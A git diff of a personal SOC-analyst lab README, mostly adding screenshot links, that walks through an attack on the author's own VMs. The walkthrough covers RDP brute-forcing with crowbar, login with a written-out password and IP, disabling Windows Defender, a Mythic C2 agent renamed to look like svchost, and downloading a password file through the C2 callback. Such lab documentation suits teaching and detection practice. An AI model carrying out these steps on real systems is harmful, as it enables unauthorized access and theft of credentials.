@@ -432,7 +432,7 @@ For this project we are using:
   <img src="https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/Screenshot%202024-10-07%20174522.png" alt="image alt">
 </p>
 
-# Setup Mythic Server
+# Setup Mythic Server and Agent
 
 1. Go to Vultr to Create a VM to use with Mythic.
    - Deploy Instance
@@ -491,10 +491,16 @@ For this project we are using:
      - Find the password for `MYTHIC_ADMIN_PASSWORD=`  
      - Copy the password
 
+![image alt](https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/Screenshot%202024-10-07%20191718.png)
+
+
    - Now at the login prompt:
      - Input: `mythic_admin`
      - Paste password  
      *You will now be able to make changes and mess around with the Mythic GUI.*
+
+![image alt](https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/Screenshot%202024-10-07%20191823.png)
+
 
 ## Setup Mythic Server and Agent
 
@@ -525,6 +531,11 @@ Phases of the attack:
      - Use: `cat rockyou.txt.gz | less`  
      *You can see the most common passwords.*
 
+
+![image alt](https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/Screenshot%202024-10-08%20143410.png)
+
+
+
    - Use: `head – 50 rockyou.txt > /home/kali/mydfir-wordlist.txt`
      *Only use the first 50 passwords in the file.*
    - Add the password you used for your Windows Server to the list  
@@ -538,13 +549,19 @@ Phases of the attack:
    - To fix repositories: 
      - Use: `sudo apt install gnupg`
 
-   **SCREENSHOT**
+![image alt](https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/Screenshot%202024-10-07%20191823.png)
 
    - Install crowbar  
      Use: `sudo apt-get install -y crowbar`
 
    - Check to see if crowbar successfully installed  
      Use: `crowbar -h`
+
+![image alt](https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/Screenshot%202024-10-07%20191812.png)
+
+
+
+     
    - Create a new file  
      *Copy the Windows server IP address from Vultr.*  
      Use: `nano target.txt`  
@@ -555,23 +572,27 @@ Phases of the attack:
      Use: `crowbar -b rdp -u Administrator -C mydfir-wordlist.txt -s (windows public address)/32`  
      *(`-b = rdp service, -u = user, -C = what you will try to authenticate with, -s = target IP address, /32 = only this IP address)*
 
-   **SCREENSHOT**
-
    - Use the tool xfreerdp to connect to the Windows server  
      Use: `xfreerdp /u:Administrator /p:Winter2024! /v:144.202.56.135:3389`
    - You can see a FreeRDP window pop up  
      *You are now connected to the Windows server by using brute force with Kali Linux.*
+
+![image alt](https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/Screenshot%202024-10-08%20143512.png)
 
 ## Phase 2:
 
 - Open a command prompt
   - Use: `whoami`, `ipconfig`, `net user administrator` *(adds administrator to admin privileges)*
 
+![image alt](https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/Screenshot%202024-10-08%20143520.png)
+
 ## Phase 3:
 
 - Disable Windows Defender
   - In Windows security go to Virus & Threat protection
   - Turn off all settings
+ 
+![image alt](https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/Screenshot%202024-10-08%20143538.png)
 
 ## Phase 4:
 
@@ -585,7 +606,7 @@ https://mythicmeta.github.io/overview/agent_matrix.html
 
 *You will now see Apollo in your Mythic GUI.*
 
-**SCREENSHOT**
+![image alt](https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/Screenshot%202024-10-08%20143550.png)
 
 - Create a C2 profile  
   *Here is a list of C2 profiles:*  
@@ -594,7 +615,9 @@ https://mythicmeta.github.io/overview/agent_matrix.html
   - Go to Powershell (Mythic)  
     Use: `./mythic-cli install github https://github.com/MythicC2Profiles/http`
 
-    **SCREENSHOT**
+   ![image alt](https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/Screenshot%202024-10-08%20143600.png)
+
+![image alt](https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/Screenshot%202024-10-08%20143607.png)
 
 - Create a new payload
   - Actions
@@ -613,7 +636,7 @@ https://mythicmeta.github.io/overview/agent_matrix.html
   - Download
     - Copy link address
 
-**SCREENSHOT**
+![image alt](https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/Screenshot%202024-10-07%20191823.png)
 
 - Back on Powershell
   - Use: `pwd`
@@ -624,7 +647,7 @@ https://mythicmeta.github.io/overview/agent_matrix.html
     Use: `mv filename svchost-miguel.exe`  
     Use: `ls`
 
-**SCREENSHOT**
+![image alt](https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/Screenshot%202024-10-07%20191823.png)
 
   - Create a directory  
     Use: `mkdir 1`  
@@ -650,4 +673,29 @@ https://mythicmeta.github.io/overview/agent_matrix.html
     Use: `.\svchost-miguel.exe`  
     Use: `netstat`  
     *You should see svchost-mig
+## Phase 6: Download the Password File
+
+1. **Active Callback in Mythic**
+    - After establishing an active callback from the target machine to the Mythic server, navigate to the active session in the Mythic Web GUI.
+
+2. **Execute Download Command**
+    - In the Mythic Web GUI, open the **Active Callback** tab.
+    - In the command input field, use the following command to download the password file:
+      ```bash
+      download C:\Users\Administrator\Documents\passwords.txt
+      ```
+
+3. **View the Downloaded File**
+    - Navigate to the **Downloads** section (represented by a paperclip icon) in the Mythic GUI.
+    - You should now see the downloaded `passwords.txt` file listed there.
+    - Click on the file to download it to your local machine for further analysis.
+
+    **Screenshot** (*optional for documentation purposes*)
+
+*You have successfully completed the process of retrieving the password file from the target machine using Mythic C2.* 
+
+![image alt](https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/Screenshot%202024-10-07%20191823.png)
+
+![image alt](https://github.com/Miguel-Manriquez-Tapia/SOC-Analyst-Project/blob/main/Screenshot%202024-10-07%20191823.png)
+
 
